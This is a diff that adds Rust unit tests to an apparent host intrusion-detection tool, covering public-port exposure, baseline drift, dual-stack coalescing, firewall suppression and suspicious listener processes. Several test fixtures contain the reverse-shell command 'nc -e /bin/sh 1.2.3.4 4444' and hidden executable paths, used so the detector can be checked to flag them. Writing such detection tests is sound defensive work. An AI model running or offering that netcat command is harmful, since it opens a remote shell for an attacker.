@@ -62,6 +62,44 @@ fn reports_new_public_port_from_baseline_drift() {
 }
 
 #[test]
+fn marks_managed_service_port_drift_for_noise_scoring() {
+    let findings = detect_with_default_config(vec![RawEvent::new("baseline", "listening_socket")
+        .with_field("protocol", "tcp6")
+        .with_field("local_addr", "::")
+        .with_field("local_port", "8443")
+        .with_field("process_name", "proxy-service")
+        .with_field("executable", "/usr/bin/proxy-service")
+        .with_field("systemd_unit", "proxy-service.service")
+        .with_field("cmdline", "/usr/bin/proxy-service run")]);
+
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-001");
+    assert!(findings[0]
+        .evidence
+        .iter()
+        .any(|item| item.key == "managed_service_listener" && item.value == "true"));
+}
+
+#[test]
+fn does_not_mark_shell_listener_as_managed_service_drift() {
+    let findings = detect_with_default_config(vec![RawEvent::new("baseline", "listening_socket")
+        .with_field("protocol", "tcp")
+        .with_field("local_addr", "0.0.0.0")
+        .with_field("local_port", "8443")
+        .with_field("process_name", "sh")
+        .with_field("executable", "/tmp/.x/sh")
+        .with_field("systemd_unit", "proxy-service.service")
+        .with_field("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444")]);
+
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-003");
+    assert!(!findings[0]
+        .evidence
+        .iter()
+        .any(|item| item.key == "managed_service_listener"));
+}
+
+#[test]
 fn suppresses_generic_udp_high_port_from_baseline_drift() {
     let findings = detect_with_default_config(vec![udp_socket_event("baseline", 51659)]);
     assert!(findings.is_empty());
@@ -98,6 +136,72 @@ fn reports_suspicious_process_on_expected_web_port() {
         .with_field("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444")]);
     assert_eq!(findings.len(), 1);
     assert_eq!(findings[0].rule_id, "NET-003");
+}
+
+#[test]
+fn reports_hidden_listener_process_on_expected_port_with_outbound_profile() {
+    let socket = RawEvent::new("network", "listening_socket")
+        .with_field("protocol", "tcp")
+        .with_field("local_addr", "0.0.0.0")
+        .with_field("local_port", "443")
+        .with_field("pid", "42")
+        .with_field("process_name", ".nginx")
+        .with_field("executable", "/usr/local/bin/.nginx")
+        .with_field("cmdline", "/usr/local/bin/.nginx --serve");
+    let process = RawEvent::new("process", "process_snapshot")
+        .with_field("pid", "42")
+        .with_field("name", ".nginx")
+        .with_field("exe_path", "/usr/local/bin/.nginx")
+        .with_field("parent_name", "bash")
+        .with_field("euid", "0");
+    let outbound = RawEvent::new("network", "outbound_connection")
+        .with_field("pid", "42")
+        .with_field("remote_addr", "8.8.8.8")
+        .with_field("remote_port", "443")
+        .with_field("remote_public", "true");
+
+    let findings = detect_with_default_config(vec![socket, process, outbound]);
+
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-003");
+    assert!(findings[0]
+        .evidence
+        .iter()
+        .any(|item| item.key == "public_outbound_count" && item.value == "1"));
+}
+
+#[test]
+fn ignores_plain_business_listener_with_public_outbound_fanout() {
+    let mut events = vec![
+        RawEvent::new("network", "listening_socket")
+            .with_field("protocol", "tcp")
+            .with_field("local_addr", "0.0.0.0")
+            .with_field("local_port", "443")
+            .with_field("pid", "42")
+            .with_field("process_name", "api")
+            .with_field("executable", "/usr/local/bin/api")
+            .with_field("cmdline", "/usr/local/bin/api"),
+        RawEvent::new("process", "process_snapshot")
+            .with_field("pid", "42")
+            .with_field("name", "api")
+            .with_field("exe_path", "/usr/local/bin/api")
+            .with_field("parent_name", "systemd")
+            .with_field("euid", "0")
+            .with_field("socket_fd_count", "64"),
+    ];
+    for index in 0..14 {
+        events.push(
+            RawEvent::new("network", "outbound_connection")
+                .with_field("pid", "42")
+                .with_field("remote_addr", format!("8.8.8.{index}"))
+                .with_field("remote_port", "443")
+                .with_field("remote_public", "true"),
+        );
+    }
+
+    let findings = detect_with_default_config(events);
+
+    assert!(findings.iter().all(|finding| finding.rule_id != "NET-003"));
 }
 
 #[test]
@@ -162,6 +266,8 @@ fn owner_change_with_systemd_execstart_mismatch_is_suspicious_listener() {
         .with_field("previous_executable", "/usr/sbin/nginx");
     let process = RawEvent::new("process", "process_snapshot")
         .with_field("pid", "42")
+        .with_field("name", "kworker")
+        .with_field("exe_path", "/tmp/.x/kworker")
         .with_field("systemd_unit", "nginx.service")
         .with_field("systemd_execstart", "/usr/sbin/nginx -g 'daemon off;'")
         .with_field("exe_hash_blake3", "abc123");
@@ -184,10 +290,102 @@ fn reports_high_risk_public_port_from_current_state() {
     let findings = detect_with_default_config(vec![socket_event("network", 6379)]);
     assert_eq!(findings.len(), 1);
     assert_eq!(findings[0].rule_id, "CONFIG-003");
+    assert_eq!(findings[0].subject, "*:6379");
     assert!(findings[0]
         .evidence
         .iter()
         .any(|item| item.key == "service_profile" && item.value == "Redis"));
+}
+
+#[test]
+fn expected_high_risk_public_port_suppresses_exposure_only_alert() {
+    let mut config = SentinelConfig::default();
+    config.network.expected_public_ports.push(6379);
+    let findings = detect(config, vec![socket_event("network", 6379)]);
+    assert!(findings.is_empty());
+}
+
+#[test]
+fn expected_high_risk_public_port_still_reports_suspicious_owner() {
+    let mut config = SentinelConfig::default();
+    config.network.expected_public_ports.push(6379);
+    let findings = detect(
+        config,
+        vec![RawEvent::new("network", "listening_socket")
+            .with_field("protocol", "tcp")
+            .with_field("local_addr", "0.0.0.0")
+            .with_field("local_port", "6379")
+            .with_field("process_name", "sh")
+            .with_field("executable", "/tmp/.x/sh")
+            .with_field("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444")],
+    );
+
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-003");
+}
+
+#[test]
+fn coalesces_dual_stack_high_risk_public_port() {
+    let findings = detect_with_default_config(vec![
+        RawEvent::new("network", "listening_socket")
+            .with_field("protocol", "tcp")
+            .with_field("local_addr", "0.0.0.0")
+            .with_field("local_port", "3000")
+            .with_field("process_name", "docker-proxy")
+            .with_field("executable", "/usr/bin/docker-proxy"),
+        RawEvent::new("network", "listening_socket")
+            .with_field("protocol", "tcp6")
+            .with_field("local_addr", "::")
+            .with_field("local_port", "3000")
+            .with_field("process_name", "docker-proxy")
+            .with_field("executable", "/usr/bin/docker-proxy"),
+    ]);
+
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "CONFIG-003");
+    assert_eq!(findings[0].subject, "*:3000");
+}
+
+#[test]
+fn coalesces_dual_stack_new_public_port_drift() {
+    let findings = detect_with_default_config(vec![
+        RawEvent::new("baseline", "listening_socket")
+            .with_field("protocol", "tcp")
+            .with_field("local_addr", "0.0.0.0")
+            .with_field("local_port", "8443")
+            .with_field("process_name", "sing-box")
+            .with_field("executable", "/usr/bin/sing-box"),
+        RawEvent::new("baseline", "listening_socket")
+            .with_field("protocol", "tcp6")
+            .with_field("local_addr", "::")
+            .with_field("local_port", "8443")
+            .with_field("process_name", "sing-box")
+            .with_field("executable", "/usr/bin/sing-box"),
+    ]);
+
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-001");
+    assert_eq!(findings[0].subject, "*:8443");
+}
+
+#[test]
+fn keeps_distinct_specific_public_listener_addresses() {
+    let findings = detect_with_default_config(vec![
+        RawEvent::new("network", "listening_socket")
+            .with_field("protocol", "tcp")
+            .with_field("local_addr", "8.8.8.8")
+            .with_field("local_port", "6379")
+            .with_field("process_name", "redis")
+            .with_field("executable", "/usr/bin/redis-server"),
+        RawEvent::new("network", "listening_socket")
+            .with_field("protocol", "tcp")
+            .with_field("local_addr", "1.1.1.1")
+            .with_field("local_port", "6379")
+            .with_field("process_name", "redis")
+            .with_field("executable", "/usr/bin/redis-server"),
+    ]);
+
+    assert_eq!(findings.len(), 2);
 }
 
 #[test]
@@ -204,6 +402,52 @@ fn high_risk_public_port_includes_firewall_context_when_available() {
         .evidence
         .iter()
         .any(|item| item.key == "firewall_status" && item.value == "active"));
+}
+
+#[test]
+fn suppresses_high_risk_public_port_when_firewall_protects_tcp_port() {
+    let findings = detect_with_default_config(vec![
+        socket_event("network", 6379),
+        RawEvent::new("firewall", "firewall_state")
+            .with_field("status", "active")
+            .with_field("sources", "nftables")
+            .with_field("protected_tcp_ports", "6379"),
+    ]);
+
+    assert!(findings.is_empty());
+}
+
+#[test]
+fn protected_high_risk_port_still_reports_suspicious_listener_process() {
+    let findings = detect_with_default_config(vec![
+        RawEvent::new("network", "listening_socket")
+            .with_field("protocol", "tcp")
+            .with_field("local_addr", "0.0.0.0")
+            .with_field("local_port", "6379")
+            .with_field("process_name", "sh")
+            .with_field("executable", "/tmp/.x/sh")
+            .with_field("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444"),
+        RawEvent::new("firewall", "firewall_state")
+            .with_field("status", "active")
+            .with_field("sources", "nftables")
+            .with_field("protected_tcp_ports", "6379"),
+    ]);
+
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-003");
+}
+
+#[test]
+fn suppresses_new_public_tcp_port_when_firewall_protects_port() {
+    let findings = detect_with_default_config(vec![
+        socket_event("baseline", 4444),
+        RawEvent::new("firewall", "firewall_state")
+            .with_field("status", "active")
+            .with_field("sources", "nftables")
+            .with_field("protected_tcp_ports", "4444"),
+    ]);
+
+    assert!(findings.is_empty());
 }
 
 #[test]
